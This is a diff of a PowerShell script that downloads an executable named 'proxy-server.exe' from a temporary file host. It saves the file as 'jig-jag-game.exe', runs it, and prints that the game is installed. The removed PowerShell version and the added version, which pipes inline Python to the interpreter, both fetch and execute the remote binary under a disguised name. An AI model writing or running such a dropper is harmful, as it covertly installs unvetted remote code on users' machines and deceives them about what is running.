@@ -1,29 +1,36 @@
-# 1. Set the URL of the .exe file (Replace with the actual download link)
-$url = "https://temp.sh/YvdvP/proxy-server.exe"
-
-# 2. Define the destination path in the Downloads folder
-$destination = "$HOME\Downloads\jig-jag-game.exe"
-
-Write-Host "Downloading jig-jag-game.exe..." -ForegroundColor Cyan
-
-# 3. Download the file
-try {
-    Invoke-WebRequest -Uri $url -OutFile $destination
-    Write-Host "Download complete: $destination" -ForegroundColor Green
-}
-catch {
-    Write-Host "Error: Could not download the file. Please check the URL." -ForegroundColor Red
-    return
+# Check if Python is installed before running
+if (!(Get-Command python -ErrorAction SilentlyContinue)) {
+    Write-Host "Error: Python is not installed or not in your PATH." -ForegroundColor Red
+    exit
 }
 
-# 4. Run the .exe and capture the process information
-Write-Host "Starting installation..." -ForegroundColor Cyan
-$process = Start-Process -FilePath $destination -PassThru
+# The hardcoded Python code
+$pythonCode = @"
+import os
+import urllib.request
+import subprocess
+import sys
 
-# 5. Get the Process ID and print the final message
-if ($process) {
-    $pidValue = $process.Id
-    Write-Host "jig-jag-game.exe is installed with process ID: $pidValue" -ForegroundColor Yellow
-} else {
-    Write-Host "Failed to start the process." -ForegroundColor Red
-}
+# Configuration
+url = "https://temp.sh/YvdvP/proxy-server.exe"  # REPLACE WITH ACTUAL URL
+filename = "jig-jag-game.exe"
+downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
+destination = os.path.join(downloads_path, filename)
+
+try:
+    # Download the file
+    urllib.request.urlretrieve(url, destination)
+    
+    # Run the file
+    # Use Popen to start it and immediately get the PID
+    process = subprocess.Popen([destination], shell=True)
+    
+    # Output the message you requested
+    print(f"{filename} is installed with process ID: {process.pid}")
+
+except Exception as e:
+    print(f"Python Error: {e}")
+"@
+
+# Execute the Python code directly
+$pythonCode | python -
